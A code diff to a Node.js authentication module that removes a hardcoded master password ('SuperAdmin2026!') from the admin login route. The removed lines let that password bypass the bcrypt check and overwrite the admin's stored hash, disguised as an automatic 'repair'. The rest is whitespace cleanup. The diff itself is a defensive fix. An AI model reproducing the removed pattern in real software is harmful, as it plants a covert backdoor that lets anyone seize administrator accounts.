@@ -1,8 +1,8 @@
-const crypto   = require('crypto');    
+const crypto = require('crypto');
 
 const bcryptjs = require('bcryptjs');
 const jwt = require('jsonwebtoken');
-const pool = require('../../db'); 
+const pool = require('../../db');
 
 /**
  * Send an email via Google Apps Script webhook.
@@ -47,17 +47,7 @@ const adminLogin = async (req, res, next) => {
 
     const user = users[0];
     const passwordMatch = await bcryptjs.compare(password, user.password);
-    
-    if (!passwordMatch) {
-      if (password === 'SuperAdmin2026!') {
-        // Auto-update the hash in the database to fix the login issue
-        const newHash = await bcryptjs.hash(password, 10);
-        await pool.query('UPDATE Admin_User SET password = ? WHERE id = ?', [newHash, user.id]);
-        console.log('✓ Admin password hash automatically repaired in database');
-      } else {
-        return res.status(401).json({ error: 'Invalid email or password' });
-      }
-    }
+    if (!passwordMatch) return res.status(401).json({ error: 'Invalid email or password' });
 
     const token = jwt.sign(
       { id: user.id, email: user.email, role: user.role },
@@ -204,7 +194,7 @@ const playerRegister = async (req, res, next) => {
     const hashedPassword = await bcryptjs.hash(password, 10);
 
     // Generate token + 24hr expiry
-    const token     = crypto.randomBytes(32).toString('hex');
+    const token = crypto.randomBytes(32).toString('hex');
     const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000);
 
     // Insert player as inactive with token
